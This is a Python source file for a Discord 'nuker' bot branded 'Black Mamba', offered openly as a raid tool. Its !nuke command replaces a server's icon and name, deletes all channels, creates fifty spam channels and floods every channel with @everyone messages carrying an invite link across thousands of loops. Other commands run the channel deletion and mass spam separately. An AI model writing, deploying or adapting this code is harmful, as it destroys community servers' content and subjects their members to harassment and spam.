import discord
from discord.ext import commands
import asyncio


intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

f = open('dependencies/bot_token.txt')
token = f.read()
f.close()


async def send_all_channels(guild, message):
    for i in range(9999):
        for channel in guild.text_channels:
            try:
                await channel.send(message)
            except Exception:
                pass

        await asyncio.sleep(0.02)

async def send_safe(channel, message):
    try:
        await channel.send("# @everyone BLACK MAMBA OWNS YOU, GET NUK3D LMAO!!")
        await channel.send("# @everyone BLACK MAMBA OWNS YOU, GET NUK3D LMAO!!")
    except discord.Forbidden:
        print(f"No permission in {channel.name}")
    except discord.HTTPException as e:
        print(f"Failed in {channel.name}: {e}")

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command()
@commands.has_permissions(administrator=True)
@commands.has_permissions(manage_guild=True)

async def nuke(ctx):
    with open("dependencies/icon.png", "rb") as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)
    await ctx.guild.edit(name="GET NUK3D BY BLACK MAMBA")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")
        guild = ctx.guild

    for i in range(50):
        try:
            await guild.create_text_channel("NUK3D BY BLACK MAMBA")
            print(f"Created channel {"NUK3D BY BLACK MAMBA"} #{i+1}")
        except Exception as e:
            print(f"Error: {e}")
    await send_all_channels(ctx.guild, "# @everyone BLACK MAMBA OWNS YOU, GET NUK3D LMAO!! https://discord.gg/sejAtBNUnw")

@bot.command()
@commands.has_permissions(manage_guild=True)
async def changeicon(ctx):
    with open("dependencies/icon.png", "rb") as f:
        icon = f.read()

    await ctx.guild.edit(icon=icon)

@bot.command()
@commands.has_permissions(manage_guild=True)
async def changename(ctx):
    await ctx.guild.edit(name="GET NUK3D BY BLACK MAMBA")

@bot.command()
@commands.has_permissions(administrator=True)
@commands.has_permissions(manage_guild=True)

async def deletechannels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

@bot.command()
async def spamall(ctx):
        await send_all_channels(ctx.guild, "# @everyone BLACK MAMBA OWNS YOU, GET NUK3D LMAO!!")
        

bot.run(token)